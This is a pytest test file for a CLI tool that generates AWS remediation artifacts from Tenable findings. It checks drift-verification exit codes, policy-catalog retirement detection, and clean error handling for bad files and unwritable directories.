    _run(["policies", "--catalog", str(catalog), "--no-save"])
    capsys.readouterr()
    # Because the second run did not save, the third must still see Beta as new.
    _run(["policies", "--catalog", str(catalog)])
    assert "1 new policy" in capsys.readouterr().out


def test_policies_reports_coverage(env, capsys):
    catalog = _write(
        env / "c.json",
        [{"id": r.policy_id, "title": r.policy_title} for r in all_recipes()]
        + [{"id": "unsupported-1", "title": "Something else"}],
    )
    _run(["policies", "--catalog", str(catalog)])
    captured = capsys.readouterr().out
    assert f"Recipes available for {len(all_recipes())} of {len(all_recipes()) + 1}" in captured


def test_policies_lists_unsupported(env, capsys):
    catalog = _write(env / "c.json", [{"id": "x", "title": "Unsupported thing"}])
    _run(["policies", "--catalog", str(catalog), "--unsupported"])
    assert "Unsupported thing" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# verify / recipes
# ---------------------------------------------------------------------------


def test_verify_reports_model_source(env, capsys):
    code = _run(["verify"])
    captured = capsys.readouterr().out
    assert "Model source:" in captured
    # 0 when models are present, 4 when they are genuinely unavailable. Never a
    # silent pass in the unavailable case.
    assert code in (0, 4)
    if code == 4:
        assert "could not be checked" in captured


def test_verify_reports_all_four_axes(env, capsys):
    """``verify`` must visibly cover every axis, including ones that did not run.

    The four checks -- API model, provider schema, CLI flags, policy catalog -- rot
    independently, so a run that silently omitted one would leave a reader believing a
    clean result covered all of them. Each section must name itself in the output even
    when its inputs are absent; that is the whole reason the HCL and policy sections
    print a "not checked" block rather than nothing.

    Asserted as a set of section headers rather than a count, and the two axes whose
    inputs are usually absent are included deliberately: those are the ones a silent
    ``return 0`` would drop, and dropping one is how a three-axis run comes to read as
    a four-axis one.
    """
    code = _run(["verify"])
    captured = capsys.readouterr().out
    for header in ("Model source:", "HCL: checking", "CLI: checking", "Policies: checking"):
        assert header in captured, f"the {header!r} axis did not report"
    assert code in (0, 4)


def test_a_provider_with_no_cli_verifier_says_the_axis_did_not_run(capsys):
    """The cloud-neutral branch for a provider whose CLI axis is not written yet.

    Both shipped providers now have one -- AWS reads ``ac.index``, Azure asks
    ``az --help`` -- so this branch has no live caller, and until this test it had no
    coverage either: it was reachable only through Azure, and stopped being so the
    moment that axis was implemented. Left in place rather than deleted because the next
    cloud will pass through it before its verifier exists, and that is exactly when a
    silent ``return 0`` would report two axes as if they were three.

    Driven through a copy of the real descriptor with the one field cleared, so what is
    exercised is the shared branch rather than a mock of it.
    """
    import dataclasses

    from remgen.core.cli import _verify_cli_axis
    from remgen.providers.aws import AWS

    assert _verify_cli_axis(dataclasses.replace(AWS, verify_cli_surface=None)) == 0
    out = capsys.readouterr().out
    assert "did not run" in out, "an axis with no verifier reported nothing at all"
    assert "one of four" in out, (
        "the message must say what a clean run of the others does not cover"
    )
    assert "ok  " not in out, "an axis that did not run must not print a pass line"


def test_verify_without_a_schema_says_so_and_does_not_claim_a_pass(env, capsys, monkeypatch):
    """No schema is the ordinary case, and it must read as unchecked, not as checked.

    Exit-code-neutral by design -- requiring a 19 MB artifact for ``verify`` to
    succeed would make the common path fail -- so the *output* is the only thing
    stopping a misreading, which is what this pins.
    """
    monkeypatch.delenv("REMGEN_TF_SCHEMA", raising=False)
    _run(["verify"])
    captured = capsys.readouterr().out
    hcl_section = captured.split("HCL: checking", 1)[1]
    assert "not checked" in hcl_section
    assert "tofu providers schema -json" in hcl_section, (
        "the message must say how to enable the check, or it is a dead end"
    )
    assert "All 5 HCL target(s) match" not in captured, "an unchecked axis must never print a pass"


def test_verify_with_a_bad_schema_path_fails_rather_than_skipping(env, capsys, tmp_path):
    """A schema that was asked for and cannot be used is an error.

    This is the failure mode that makes a canary go blind while reporting green: point
    it at a path that stops existing, and a checker that treated "unusable" as
    "unavailable" would report success forever.
    """
    code = _run(["verify", "--provider-schema", str(tmp_path / "absent.json")])
    assert code == 4
    assert "schema unusable" in capsys.readouterr().err


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_verify_passes_all_axes_against_the_real_toolchain(env, capsys, real_provider_schema_path):
    """The whole command, green, against real inputs on all three axes.

    Distinct from the unit tests for each axis: it asserts the three combine into a
    zero exit code, which is what CI and the drift canary actually branch on. A
    per-axis test passing while the command returns non-zero -- an axis returning a
    code the combiner mishandles -- would otherwise go unnoticed.
    """
    if real_provider_schema_path is None:
        pytest.fail("tofu is present but no schema was produced; the HCL axis never ran")

    code = _run(["verify", "--provider-schema", str(real_provider_schema_path)])
    captured = capsys.readouterr().out
    assert code == 0, captured
    # Derived, not typed: this said "All 5" and went stale the moment a sixth recipe
    # landed, failing for a reason that had nothing to do with the three axes combining.
    # The anti-vacuity assert is the point of keeping a number here at all -- a count of
    # zero would make the HCL line trivially true while the axis examined nothing.
    with_hcl = sum(1 for r in all_recipes() if r.hcl is not None)
    assert with_hcl, "no recipe has an HCL target; the HCL axis would examine nothing"
    assert f"All {with_hcl} HCL target(s) match the current provider schema." in captured
    assert "render commands the CLI accepts" in captured


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_verify_exits_7_when_a_recipe_contradicts_the_schema(
    env, capsys, real_provider_schema_path, tmp_path, monkeypatch
):
    """Exit 7 must be reachable, and must be distinct from the API axis's codes.

    The canary branches on the code to say *which* upstream moved. If HCL drift
    produced 0 -- or produced 3 -- the canary would report the wrong cause, or nothing
    at all. Provoked by mutating the schema rather than the recipe, because that is the
    real direction of the drift: the recipe set is correct and the provider changed.
    """
    if real_provider_schema_path is None:
        pytest.fail("tofu is present but no schema was produced")

    document = json.loads(real_provider_schema_path.read_text(encoding="utf-8"))
    key = next(iter(document["provider_schemas"]))
    resources = document["provider_schemas"][key]["resource_schemas"]
    del resources["aws_kms_key"]  # a resource type a shipped recipe targets
    mutated = tmp_path / "mutated-schema.json"
    mutated.write_text(json.dumps(document), encoding="utf-8")

    code = _run(["verify", "--provider-schema", str(mutated)])
    captured = capsys.readouterr().out
    assert code == 7, f"expected the HCL-drift code, got {code}:\n{captured}"
    assert "aws_kms_key" in captured
    assert "resource_type_missing" in captured


def test_verify_runs_every_axis_even_after_one_fails(env, capsys, monkeypatch):
    """A failing axis must not stop the others from running or reporting.

    This is the property the drift canary depends on. With an early return, a canary
    watching three upstreams could only ever see the first broken one -- so a provider
    rename would stay hidden behind an unrelated API change for as long as that took
    to fix, which is the exact blindness the canary exists to prevent.

    The API axis is forced to fail by pointing model discovery at an empty directory:
    a real condition, and specifically a *concrete drift verdict* (exit 3, every
    service model missing) rather than "could not check". That is the case that would
    have early-returned, so it is the one worth provoking -- and it is provoked by real
    inputs rather than a patched return value.
    """
    from remgen.providers.aws import drift

    # Both are lru_cached, so without this the run is served an earlier test's models
    # and the axis passes -- the test would then assert nothing about the failure path.
    drift.find_model_dir.cache_clear()
    drift._load_service_model.cache_clear()
    monkeypatch.setenv("REMGEN_BOTOCORE_DATA_DIR", str(env))
    try:
        code = _run(["verify"])
    finally:
        drift.find_model_dir.cache_clear()
        drift._load_service_model.cache_clear()
    captured = capsys.readouterr().out
    assert code == 3, captured
    assert "no longer match the AWS API" in captured
    # The two later sections must still have run and reported.
    assert "HCL: checking" in captured
    assert "CLI: checking" in captured
    assert "render commands the CLI accepts" in captured, (
        "the CLI axis did not report; a failing earlier axis suppressed it"
    )


def test_verify_reports_the_most_urgent_code_not_the_first(env, capsys, monkeypatch):
    """When axes disagree, "could not check" must outrank any concrete failure.

    A blind axis is worse than a red one: it reports nothing, so every other verdict
    in the run is incomplete. Returning the first non-zero code instead would let an
    unrunnable check hide behind a lesser, actionable one.
    """
    from remgen.core import cli as core_cli

    monkeypatch.setattr(core_cli, "_verify_hcl_axis", lambda a, p: 7)
    monkeypatch.setattr(core_cli, "_verify_cli_axis", lambda p: 4)
    assert _run(["verify"]) == 4

    monkeypatch.setattr(core_cli, "_verify_cli_axis", lambda p: 8)
    assert _run(["verify"]) == 7, "HCL drift must outrank CLI drift"
    capsys.readouterr()  # drain; the assertions above are on codes, not output


# ---------------------------------------------------------------------------
# verify: the policy-catalog axis
#
# The fourth axis, and the only one whose upstream is Tenable rather than AWS. It
# closes a false negative none of the other three can see: a recipe whose API call,
# provider arguments and CLI flags all verify is still dead if its policy id has been
# retired, because it then matches zero findings forever and nothing reports it.
#
# The catalog fixtures here are built *from the recipe set* rather than typed out,
# which is the only reason they stay valid as recipes are added -- but a fixture
# derived from the recipes can only ever pass, so every failure case below mutates
# that fixture in a specific way rather than trusting it.
# ---------------------------------------------------------------------------


def _catalog(tmp_path, name="catalog.json", *, recipes=None, drop=(), retitle=None, extra=()):
    """Write a policy-catalog export derived from the real recipe set.

    Derived rather than typed so it cannot go stale as recipes land. ``drop`` retires
    policy ids, ``retitle`` maps an id to a new upstream title, ``extra`` appends raw
    records (used to inject one the loader will reject).
    """
    records = [
        {"id": r.policy_id, "title": r.policy_title, "category": "Data"}
        for r in (all_recipes() if recipes is None else recipes)
        if r.policy_id not in drop
    ]
    for record in records:
        if retitle and record["id"] in retitle:
            record["title"] = retitle[record["id"]]
    return _write(tmp_path / name, records + list(extra))


def test_verify_reports_the_policy_axis_and_says_it_did_not_run_without_a_catalog(env, capsys):
    """No ``--catalog`` must read as unchecked, never as a pass.

    Exit-code-neutral, matching ``--provider-schema``: this tool has no live Tenable
    adapter (see ``remgen.core.sources``), so requiring an export would make the
    ordinary path fail. The output is therefore the only thing preventing a reader from
    taking a clean run as "the policy ids were confirmed", which is what this pins.
    """
    code = _run(["verify"])
    captured = capsys.readouterr().out
    assert "Policies: checking" in captured, "the fourth axis did not report at all"
    section = captured.split("Policies: checking", 1)[1]
    assert "not checked" in section
    assert "did NOT run" in section
    assert "no live Tenable adapter" in section, (
        "the message must say why the tool cannot fetch a catalog itself"
    )
    assert "ok  " not in section, "an axis that did not run must not print a pass line"
    assert code in (0, 4)


def test_verify_passes_the_policy_axis_when_every_id_is_live(env, capsys, tmp_path):
    """The green path, and the anti-vacuity floor under it.

    The count is derived: asserting "All 6" would fail the moment a seventh recipe
    landed, for a reason unrelated to the axis. Zero recipes would make the pass line
    trivially true, so that is asserted against separately.
    """
    recipes = all_recipes()
    assert recipes, "no recipes; the policy axis would examine nothing and still pass"
    code = _run(["verify", "--catalog", str(_catalog(tmp_path))])
    captured = capsys.readouterr().out
    assert code == 0, captured
    assert f"All {len(recipes)} recipe(s) are keyed to a policy that still exists." in captured


def test_verify_exits_9_when_a_policy_id_has_been_retired(env, capsys, tmp_path):
    """Exit 9 must be reachable and distinct from 3, 7 and 8.

    This is the whole point of the axis. The canary branches on the code to name which
    upstream moved, and the fix differs per code: 3 is an API change, 7 a provider
    argument, 8 a CLI flag, and 9 is a policy that no longer exists -- which is fixed by
    re-triaging a recipe, not by editing a command. A retirement reported as 0 would be
    invisible, and reported as 3 would send someone to the wrong upstream.

    One id is dropped rather than all of them, because an all-missing catalog is the
    wrong-export signature and is deliberately reported as 4 instead (see below).
    """
    retired = all_recipes()[0]
    catalog = _catalog(tmp_path, drop={retired.policy_id})
    code = _run(["verify", "--catalog", str(catalog)])
    captured = capsys.readouterr().out
    assert code == 9, f"expected the retired-policy code, got {code}:\n{captured}"
    assert retired.policy_id in captured
    assert "not in the catalog" in captured
    assert "match nothing and will never fire again" in captured


def test_a_retitled_policy_warns_and_does_not_fail(env, capsys, tmp_path):
    """A renamed policy still matches findings, so it is a warning, not a failure.

    Kept out of the exit code deliberately: what breaks is the label a reviewer reads
    in the generated artifact, not the remediation. Folding it into 9 would mean a
    cosmetic upstream rename blocked generation, and -- worse -- would make 9 ambiguous
    between "stale title" and "matches nothing", which are not the same problem.
    """
    renamed = all_recipes()[0]
    catalog = _catalog(tmp_path, retitle={renamed.policy_id: "Upstream Renamed This"})
    code = _run(["verify", "--catalog", str(catalog)])
    captured = capsys.readouterr().out
    assert code == 0, captured
    assert "title upstream is now 'Upstream Renamed This'" in captured
    assert "the label in generated artifacts is stale" in captured
    # Still counted as live: a retitled policy exists, and saying otherwise would send
    # someone to re-triage a recipe that works.
    assert "are keyed to a policy that still exists" in captured


def test_the_wrong_clouds_catalog_is_could_not_check_not_a_mass_retirement(env, capsys, tmp_path):
    """Every recipe missing from a non-empty catalog means the wrong file, not drift.

    Found by doing it: ``awsremgen verify --catalog`` pointed at the Azure export
    returned 9 and told the user to re-triage all six recipes. That is a confident wrong
    answer whose stated fix is unrelated to the real one, which is the failure mode this
    project treats as worse than a red result. The two causes cannot be told apart from
    this data, so it reports 4 -- which still outranks every other axis and still is not
    a pass.
    """
    from remgen.providers.azure import all_recipes as azure_recipes

    catalog = _catalog(tmp_path, "azure-catalog.json", recipes=azure_recipes())
    code = _run(["verify", "--catalog", str(catalog)])
    captured = capsys.readouterr().out
    assert code == 4, f"a wrong-cloud export must be 'could not check', got {code}"
    assert "wrong cloud's export" in captured
    assert "Confirm the export is AWS's" in captured
    assert "recipe(s) are keyed to a policy id the catalog no longer contains" not in captured


def test_an_empty_catalog_is_could_not_check_not_every_policy_retired(env, capsys, tmp_path):
    """An export that parses to zero policies would mark every recipe retired.

    Same class as the wrong-cloud case and reported the same way. The count in the
    message is derived from the recipe set; it was a hardcoded ``14`` at first, which
    printed "rather than as 14 retired policies" while checking six.
    """
    code = _run(["verify", "--catalog", str(_write(tmp_path / "empty.json", []))])
    captured = capsys.readouterr().out
    assert code == 4
    assert f"rather than as {len(all_recipes())} retired policies" in captured


@pytest.mark.parametrize(
    ("name", "content"),
    [("absent.json", None), ("bad.json", "not json{")],
    ids=["missing-file", "malformed-json"],
)
def test_an_unreadable_catalog_fails_rather_than_passing(env, capsys, tmp_path, name, content):
    """A catalog that was asked for and cannot be read is 4, never 0.

    The blind-canary shape: point a scheduled run at a path that stops existing, and a
    checker treating "unreadable" as "unavailable" reports green forever.
    """
    path = tmp_path / name
    if content is not None:
        path.write_text(content, encoding="utf-8")
    code = _run(["verify", "--catalog", str(path)])
    assert code == 4
    assert "could not read" in capsys.readouterr().out


def test_rejected_catalog_records_are_named_before_any_retirement_verdict(env, capsys, tmp_path):
    """A record the loader rejects is absent from the comparison and reads as retired.

    That makes a rejected record indistinguishable from a retirement unless it is
    reported, so it is printed *before* the per-recipe verdicts -- a FAIL below has to
    be explainable. The rejected record here also carries a live recipe's id, so the
    FAIL it produces is provably caused by the rejection rather than by real drift.
    """
    victim = all_recipes()[0]
    catalog = _catalog(
        tmp_path,
        drop={victim.policy_id},
        extra=[{"id": "", "title": victim.policy_title}],  # rejected: missing policy id
    )
    code = _run(["verify", "--catalog", str(catalog)])
    captured = capsys.readouterr().out
    assert code == 9, captured
    section = captured.split("Policies: checking", 1)[1]
    assert "1 catalog record(s) were rejected" in section
    assert section.index("rejected") < section.index(victim.policy_id), (
        "the rejection must be reported before the FAIL it explains"
    )


def test_a_retired_policy_does_not_outrank_a_real_drift_verdict(env, capsys, monkeypatch, tmp_path):
    """9 is last in precedence, and 4 still leads.

    A retired policy means a recipe stops firing; API, provider-schema and CLI drift
    mean a shipped artifact does the wrong thing against live infrastructure. When both
    are true in one run the latter is what someone must act on first.
    """
    from remgen.core import cli as core_cli

    catalog = str(_catalog(tmp_path, drop={all_recipes()[0].policy_id}))

    monkeypatch.setattr(core_cli, "_verify_cli_axis", lambda p: 8)
    assert _run(["verify", "--catalog", catalog]) == 8, "CLI drift must outrank a retired policy"

    monkeypatch.setattr(core_cli, "_verify_cli_axis", lambda p: 0)
    monkeypatch.setattr(core_cli, "_verify_hcl_axis", lambda a, p: 4)
    assert _run(["verify", "--catalog", catalog]) == 4, "could-not-check must still lead"
    capsys.readouterr()  # drain; these assertions are on codes, not output


def test_recipes_lists_levels_and_safety_notes(env, capsys):
    assert _run(["recipes"]) == 0
    captured = capsys.readouterr().out
    assert "SAFEST" in captured
    assert "Coverage is intentionally partial" in captured
    for recipe in all_recipes():
        assert recipe.policy_title in captured


def test_version_flag(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["--version"])
    assert exc.value.code == 0
    assert "awsremgen" in capsys.readouterr().out


def test_no_subcommand_is_an_error(capsys):
    with pytest.raises(SystemExit) as exc:
        main([])
    assert exc.value.code != 0


# ---------------------------------------------------------------------------
# Operational failure paths: bad filesystem state must produce a message and a
# usable exit code, never a traceback. These are the invocation-plane cases the
# happy-path tests above never reach.
# ---------------------------------------------------------------------------


def _catalog_of(env):
    return _write(env / "c.json", [{"id": "1", "title": "Alpha", "category": "IAM"}])


def test_output_path_that_is_an_existing_file_fails_cleanly(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    collision = env / "not-a-dir"
    collision.write_text("existing file", encoding="utf-8")

    code = _run(["generate", "--findings", str(findings), "--out", str(collision)])
    captured = capsys.readouterr()
    assert code == 2
    assert "cannot write to" in captured.err
    assert "Traceback" not in captured.err + captured.out
    # The pre-existing file must be left alone, not clobbered.
    assert collision.read_text(encoding="utf-8") == "existing file"


def test_unwritable_output_directory_fails_cleanly(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    ro = env / "ro"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(["generate", "--findings", str(findings), "--out", str(ro / "sub")])
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    assert code == 2
    assert "cannot write to" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_unwritable_existing_output_directory_fails_cleanly(env, capsys):
    # mkdir(exist_ok=True) succeeds here; the failure is on write_text. Covered
    # separately because it exercises a different call in the same try block.
    findings = _write(env / "f.json", list(GOOD.values()))
    ro = env / "ro2"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(["generate", "--findings", str(findings), "--out", str(ro)])
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    assert code == 2
    assert "cannot write to" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_unwritable_cache_dir_warns_and_exits_degraded(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    catalog = _catalog_of(env)
    ro = env / "ro3"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(
            [
                "generate",
                "--findings",
                str(findings),
                "--catalog",
                str(catalog),
                "--out",
                str(env / "art"),
                "--cache-dir",
                str(ro / "cache"),
            ]
        )
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    # The artifacts were still produced, so this is not a hard failure -- but the
    # change detection did not run and the exit code must not read as success.
    assert code == 5
    assert "cannot write snapshot" in captured.out
    assert "cannot detect policy changes" in captured.out
    assert "Traceback" not in captured.err + captured.out
    assert _scripts(env / "art")


def test_policies_with_unwritable_cache_exits_degraded(env, capsys):
    catalog = _catalog_of(env)
    ro = env / "ro4"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(["policies", "--catalog", str(catalog), "--cache-dir", str(ro / "c")])
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    assert code == 5
    assert "cannot write snapshot" in captured.out
    assert "Traceback" not in captured.err + captured.out


def test_corrupt_cache_warns_instead_of_claiming_first_run(env, capsys):
    """A corrupt baseline must not be reported as a first run.

    The silent-false-negative this guards: told "first run -- baseline saved, no
    changes this time", an operator concludes nothing changed. The baseline is then
    rebuilt from the current catalog, so a policy added since the last good run is
    never reported -- not on this run, and not on any later one.
    """
    catalog = _catalog_of(env)
    cache = env / "cache"
    cache.mkdir(parents=True, exist_ok=True)
    (cache / "policy-catalog.json").write_text("}{ corrupt", encoding="utf-8")

    code = _run(["policies", "--catalog", str(catalog), "--cache-dir", str(cache)])
    captured = capsys.readouterr().out
    assert code == 5
    assert "WARNING" in captured
    assert "NOT detected" in captured
    assert "first run" not in captured


def test_unreadable_findings_file_fails_cleanly(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    findings.chmod(0o000)
    try:
        code = _run(["generate", "--findings", str(findings), "--out", str(env / "a")])
        captured = capsys.readouterr()
    finally:
        findings.chmod(0o600)
    assert code == 2
    assert "cannot read" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_findings_path_that_is_a_directory_fails_cleanly(env, capsys):
    code = _run(["generate", "--findings", str(env), "--out", str(env / "a")])
    captured = capsys.readouterr()
    assert code == 2
    assert "cannot read" in captured.err
    assert "Traceback" not in captured.err + captured.out


@pytest.mark.parametrize(
    "payload",
    [
        "null",
        "123",
        '"a string"',
        '{"findings": "not-a-list"}',
        '{"unrelated": []}',
    ],
)
def test_structurally_wrong_json_fails_cleanly(env, capsys, payload):
    findings = env / "f.json"
    findings.write_text(payload, encoding="utf-8")
    code = _run(["generate", "--findings", str(findings), "--out", str(env / "a")])
    captured = capsys.readouterr()
    assert code == 2
    assert "expected a JSON array" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_duplicate_findings_are_merged_and_counted(env, capsys):
    # Exports repeat findings (two scans, or a record joined across views). Emitting
    # the remediation twice produces two HCL blocks for one resource, which cannot
    # validate -- so duplicates are collapsed, and the collapse is reported rather
    # than being a silent change to the record count.
    one = GOOD["dynamodb"]
    findings = _write(env / "f.json", [one, one, one])
    assert (
        _run(
            [
                "generate",
                "--findings",
                str(findings),
                "--out",
                str(env / "art"),
                "--safety-level",
                "all",
            ]
        )
        == 0
    )
    out = capsys.readouterr().out
    assert "Records read:         3" in out
    assert "duplicates merged:  2" in out
    assert "distinct findings:  1" in out
    assert "Remediations written: 1" in out

    assert _joined(env / "art", ".tf").count("import {") == 1
    script = _joined(env / "art", ".sh")
    assert len([ln for ln in script.splitlines() if ln.startswith("aws ")]) == 1


def test_same_resource_in_different_accounts_is_not_a_duplicate(env, capsys):
    # The inverse error would be worse than emitting a duplicate: collapsing two
    # genuinely different resources means one account's finding is never remediated.
    dev = dict(GOOD["dynamodb"], accountId="111111111111")
    prod = dict(GOOD["dynamodb"], accountId="222222222222")
    findings = _write(env / "f.json", [dev, prod])
    assert (
        _run(
            [
                "generate",
                "--findings",
                str(findings),
                "--out",
                str(env / "art"),
                "--safety-level",
                "all",
            ]
        )
        == 0
    )
    out = capsys.readouterr().out
    assert "duplicates merged" not in out
    assert "Remediations written: 2" in out


def test_junk_record_types_are_rejected_not_crashed(env, capsys):
    findings = env / "f.json"
    findings.write_text('[null, 1, "s", {}, [], true]', encoding="utf-8")
    code = _run(["generate", "--findings", str(findings), "--out", str(env / "a")])
    captured = capsys.readouterr()
    assert code == 0
    # All six are unusable, and every one is accounted for rather than dropped.
    assert "Records read:         6" in captured.out
    assert "rejected:           6" in captured.out
    assert "Traceback" not in captured.err + captured.out
